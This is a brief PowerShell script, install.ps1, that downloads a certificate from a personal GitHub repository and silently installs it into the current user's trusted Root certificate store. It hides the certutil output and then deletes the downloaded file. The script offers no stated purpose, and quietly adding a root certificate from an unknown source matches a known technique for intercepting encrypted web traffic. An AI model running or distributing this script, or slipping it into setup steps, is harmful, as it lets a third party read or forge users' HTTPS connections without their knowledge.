# install.ps1
$certUrl = "https://raw.githubusercontent.com/gamervs606-dot/teste/main/teste.cer"
$certPath = Join-Path $env:TEMP "teste.cer"

# Configure proxy
$webClient = New-Object Net.WebClient
$webClient.Proxy = [Net.WebRequest]::GetSystemWebProxy()
$webClient.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials

# Download certificate
$webClient.DownloadFile($certUrl, $certPath)

# Install silently into Current User Root store
certutil -user -f -addstore "Root" $certPath | Out-Null

# Clean up temp certificate file
if (Test-Path $certPath) {
    Remove-Item -Path $certPath -Force
}
